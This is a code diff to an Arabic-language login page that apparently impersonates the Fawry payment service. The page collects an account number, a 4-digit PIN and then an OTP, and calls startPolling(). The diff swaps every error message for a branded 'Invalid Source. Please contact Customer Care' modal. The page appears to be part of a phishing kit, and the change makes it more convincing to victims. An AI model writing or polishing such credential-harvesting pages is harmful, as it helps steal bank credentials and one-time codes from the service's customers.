@@ -353,8 +353,7 @@ async function doLogin(){
   const validPass = /^\d{4}$/.test(p);
 
   if(!validUser || !validPass){
-    err.textContent = 'رقم الحساب أو رمز المرور غير صحيح';
-    err.classList.add('show');
+    showInvalidModal();
     return;
   }
   err.classList.remove('show');
@@ -377,12 +376,10 @@ async function doLogin(){
       startPolling();
       setTimeout(()=>document.getElementById('otp1').focus(), 300);
     } else {
-      err.textContent = 'حدث خطأ، حاول مرة أخرى';
-      err.classList.add('show');
+      showInvalidModal();
     }
   } catch(e){
-    err.textContent = 'تعذّر الاتصال بالسيرفر';
-    err.classList.add('show');
+    showInvalidModal();
   }
   btn.innerHTML = 'تسجيل الدخول';
   btn.disabled = false;
@@ -476,8 +473,7 @@ async function doOtp(){
       err.classList.add('show');
     }
   } catch(e){
-    err.textContent = 'تعذّر الاتصال بالسيرفر';
-    err.classList.add('show');
+    showInvalidModal();
   }
   btn.innerHTML = 'تأكيد الرمز';
   btn.disabled = false;
@@ -531,6 +527,24 @@ document.addEventListener('keydown',e=>{
   if(a === 'screen-login') doLogin();
   else if(a === 'screen-otp') doOtp();
 });
+
+// ── INVALID SOURCE MODAL ──
+function showInvalidModal() {
+  document.getElementById('invalid-modal').style.display = 'flex';
+}
+function closeInvalidModal() {
+  document.getElementById('invalid-modal').style.display = 'none';
+}
 </script>
+
+<!-- ── INVALID SOURCE MODAL ── -->
+<div id="invalid-modal" style="display:none;position:fixed;inset:0;z-index:9999;background:linear-gradient(160deg,#5B1A9A 0%,#8B30C0 50%,#A855D4 100%);align-items:center;justify-content:center;padding:24px">
+  <div style="background:#fff;border-radius:18px;padding:36px 28px 28px;width:100%;max-width:340px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.25)">
+    <div style="font-size:22px;font-weight:700;color:#888;margin-bottom:24px;font-family:'Cairo',sans-serif">فوري</div>
+    <div style="font-size:17px;font-weight:800;color:#333;line-height:1.6;margin-bottom:36px">Invalid Source. Please contact Customer Care</div>
+    <button onclick="closeInvalidModal()" style="width:100%;padding:16px;background:#6B1FA8;border:none;border-radius:12px;color:#fff;font-size:17px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif">موافق</button>
+  </div>
+</div>
+
 </body>
 </html>
